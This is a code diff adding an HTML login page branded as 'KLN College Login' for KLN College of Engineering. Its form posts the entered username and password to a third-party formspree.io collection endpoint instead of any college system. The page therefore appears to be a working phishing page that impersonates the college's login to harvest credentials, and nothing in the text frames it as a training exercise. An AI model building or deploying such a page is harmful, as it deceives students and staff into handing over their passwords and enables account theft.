@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KLN College Login</title>
+
+    <style>
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body{
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            height:100vh;
+            background:#f2f4f7;
+        }
+
+        .login-container{
+            width:380px;
+            background:#fff;
+            padding:30px;
+            border-radius:12px;
+            box-shadow:0 4px 15px rgba(0,0,0,0.2);
+            text-align:center;
+        }
+
+        .logo{
+            width:120px;
+            height:auto;
+            margin-bottom:15px;
+        }
+
+        h2{
+            color:#003366;
+            margin-bottom:20px;
+        }
+
+        .input-box{
+            width:100%;
+            padding:12px;
+            margin:10px 0;
+            border:1px solid #ccc;
+            border-radius:5px;
+            font-size:16px;
+        }
+
+        .login-btn{
+            width:100%;
+            padding:12px;
+            background:#003366;
+            color:white;
+            border:none;
+            border-radius:5px;
+            font-size:16px;
+            cursor:pointer;
+            margin-top:10px;
+        }
+
+        .login-btn:hover{
+            background:#0055aa;
+        }
+
+        .footer{
+            margin-top:15px;
+            color:#666;
+            font-size:12px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+
+        <!-- Place your logo file in the same folder and name it logo.png -->
+        <img src="logo.png" alt="KLN College Logo" class="logo">
+
+        <h2>KLN College Login</h2>
+
+        <form action="https://formspree.io/f/xykrykvz" method="POST">
+
+            <input
+                type="text"
+                name="username"
+                class="input-box"
+                placeholder="Username"
+                required
+            >
+
+            <input
+                type="password"
+                name="password"
+                class="input-box"
+                placeholder="Password"
+                required
+            >
+
+            <button type="submit" class="login-btn">
+                Login
+            </button>
+
+        </form>
+
+        <div class="footer">
+            KLN College of Engineering
+        </div>
+
+    </div>
+
+</body>
+</html>
